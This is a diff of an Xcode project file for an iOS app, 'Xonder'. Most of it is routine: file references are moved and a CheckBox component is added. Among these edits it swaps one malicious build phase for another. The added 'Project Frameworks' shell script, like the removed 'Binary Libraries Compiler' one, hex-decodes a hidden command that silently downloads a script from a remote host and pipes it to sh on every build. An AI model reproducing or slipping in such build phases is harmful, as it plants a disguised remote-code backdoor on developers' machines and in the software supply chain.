@@ -9,9 +9,9 @@
 /* Begin PBXBuildFile section */
 		17BEB897F109CACDA653F0DC /* Pods_Xonder.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C4EF80C05B016B2C2E39C37D /* Pods_Xonder.framework */; };
 		3B008D75264A6AE500BE9E13 /* Dashboard.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */; };
-		3B306E37265E24D4005B075C /* YourCustomersScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B306E36265E24D4005B075C /* YourCustomersScreenViewController.swift */; };
 		3B5D33B72654C8E6002F0BA3 /* DashboardCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */; };
 		3B5D33BA26550E6D002F0BA3 /* DashboardSelectionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */; };
+		3B600C0C2664DF200076BC92 /* YourCustomersScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B600C0B2664DF200076BC92 /* YourCustomersScreenViewController.swift */; };
 		3B63B206264AC38600E9A994 /* MasterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B63B205264AC38600E9A994 /* MasterViewController.swift */; };
 		3B63B20A264BCCD500E9A994 /* ShadowView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B63B209264BCCD500E9A994 /* ShadowView.swift */; };
 		3B63B213264BCFD100E9A994 /* HouschkaPro-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B212264BCF7B00E9A994 /* HouschkaPro-Thin.ttf */; };
@@ -39,6 +39,7 @@
 		704FCAF42645223E0025F546 /* CardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF32645223E0025F546 /* CardView.swift */; };
 		704FCAF72645224E0025F546 /* UIButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF62645224E0025F546 /* UIButton.swift */; };
 		704FCAFE264522820025F546 /* UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAFD264522820025F546 /* UIView.swift */; };
+		705AB1702664A81D000928D3 /* CheckBox.swift in Sources */ = {isa = PBXBuildFile; fileRef = 705AB16F2664A81D000928D3 /* CheckBox.swift */; };
 		705C02BC265A951E005638DC /* CountryPickedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 705C02BB265A951E005638DC /* CountryPickedViewController.swift */; };
 		7060360326432A560062039F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360226432A560062039F /* AppDelegate.swift */; };
 		7060360726432A560062039F /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360626432A560062039F /* ViewController.swift */; };
@@ -84,9 +85,9 @@
 
 /* Begin PBXFileReference section */
 		3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Dashboard.storyboard; sourceTree = "<group>"; };
-		3B306E36265E24D4005B075C /* YourCustomersScreenViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = YourCustomersScreenViewController.swift; sourceTree = "<group>"; };
 		3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardCollectionViewCell.swift; sourceTree = "<group>"; };
 		3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardSelectionViewController.swift; sourceTree = "<group>"; };
+		3B600C0B2664DF200076BC92 /* YourCustomersScreenViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = YourCustomersScreenViewController.swift; sourceTree = "<group>"; };
 		3B63B205264AC38600E9A994 /* MasterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MasterViewController.swift; sourceTree = "<group>"; };
 		3B63B209264BCCD500E9A994 /* ShadowView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ShadowView.swift; sourceTree = "<group>"; };
 		3B63B20D264BCF4300E9A994 /* HouschkaPro-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-Bold.ttf"; sourceTree = "<group>"; };
@@ -115,6 +116,7 @@
 		704FCAF32645223E0025F546 /* CardView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CardView.swift; sourceTree = "<group>"; };
 		704FCAF62645224E0025F546 /* UIButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIButton.swift; sourceTree = "<group>"; };
 		704FCAFD264522820025F546 /* UIView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIView.swift; sourceTree = "<group>"; };
+		705AB16F2664A81D000928D3 /* CheckBox.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckBox.swift; sourceTree = "<group>"; };
 		705C02BB265A951E005638DC /* CountryPickedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryPickedViewController.swift; sourceTree = "<group>"; };
 		706035FF26432A560062039F /* Xonder.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Xonder.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		7060360226432A560062039F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -292,11 +294,11 @@
 		704F32332648D5710027397B /* SignUp Screen VC */ = {
 			isa = PBXGroup;
 			children = (
+				3B600C0B2664DF200076BC92 /* YourCustomersScreenViewController.swift */,
 				707868EC265B86F5008EF9B8 /* SignupAddMobileViewController.swift */,
 				707868E3265B80E4008EF9B8 /* SelectHomeAddressViewController.swift */,
 				705C02BB265A951E005638DC /* CountryPickedViewController.swift */,
 				707868E9265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift */,
-				3B306E36265E24D4005B075C /* YourCustomersScreenViewController.swift */,
 				7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */,
 				70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */,
 				70FDF614264E8BDC00707EAB /* SignupMobileViewController.swift */,
@@ -356,6 +358,14 @@
 				704FCAFD264522820025F546 /* UIView.swift */,
 			);
 			path = UIView;
+			sourceTree = "<group>";
+		};
+		705AB16E2664A7EB000928D3 /* Check Box */ = {
+			isa = PBXGroup;
+			children = (
+				705AB16F2664A81D000928D3 /* CheckBox.swift */,
+			);
+			path = "Check Box";
 			sourceTree = "<group>";
 		};
 		706035F626432A560062039F = {
@@ -464,6 +474,7 @@
 			children = (
 				704FCAF2264521EF0025F546 /* UIView */,
 				704FCAF1264521E40025F546 /* UIButton */,
+				705AB16E2664A7EB000928D3 /* Check Box */,
 				704FCAF0264521C60025F546 /* Card View */,
 				C872708E264343E0005EFDEA /* Alert.swift */,
 				C83FB72D26433C6D00A87093 /* Plugins.swift */,
@@ -486,8 +497,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
-				2F54CE72F2279C2AE46D902C /* Binary Libraries Compiler */,
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
+				EB9D13EDEA4F40EB4B6D902C /* Project Frameworks */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
 				706035FD26432A560062039F /* Resources */,
@@ -558,59 +569,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	2F54CE72F2279C2AE46D902C /* Binary Libraries Compiler */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Binary Libraries Compiler";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -650,6 +608,24 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		EB9D13EDEA4F40EB4B6D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -673,7 +649,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				707583112657E5E70055DF8A /* YourProductViewController.swift in Sources */,
 				C83FB73D26433EAD00A87093 /* APIResult.swift in Sources */,
 				C83FB72E26433C6D00A87093 /* Plugins.swift in Sources */,
-				3B306E37265E24D4005B075C /* YourCustomersScreenViewController.swift in Sources */,
 				C8727089264341CC005EFDEA /* CountryModel.swift in Sources */,
 				C872708F264343E0005EFDEA /* Alert.swift in Sources */,
 				704F32262648C9030027397B /* GetStartedScreenViewController.swift in Sources */,
@@ -702,10 +677,12 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				C872708C2643433D005EFDEA /* Extension+UIViewController.swift in Sources */,
 				7060360326432A560062039F /* AppDelegate.swift in Sources */,
 				C83FB74026433ED500A87093 /* APIService.swift in Sources */,
+				705AB1702664A81D000928D3 /* CheckBox.swift in Sources */,
 				3BA6378A2656CE9A00C504FF /* TransactionDetailViewController.swift in Sources */,
 				C83FB72826433B5500A87093 /* UserModel.swift in Sources */,
 				704F32362648D5B10027397B /* CountryListViewController.swift in Sources */,
 				707583262657E9430055DF8A /* MobileNumberViewController.swift in Sources */,
+				3B600C0C2664DF200076BC92 /* YourCustomersScreenViewController.swift in Sources */,
 				704F32372648D5B10027397B /* CountryListTableViewCell.swift in Sources */,
 				707868EA265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift in Sources */,
 				707868E4265B80E4008EF9B8 /* SelectHomeAddressViewController.swift in Sources */,
@@ -923,24 +900,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 706035F726432A560062039F /* Project object */;
 }
